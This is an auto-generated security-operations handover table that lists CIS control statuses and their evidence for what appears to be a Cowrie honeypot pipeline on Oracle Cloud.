| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-03T15:24:16Z_
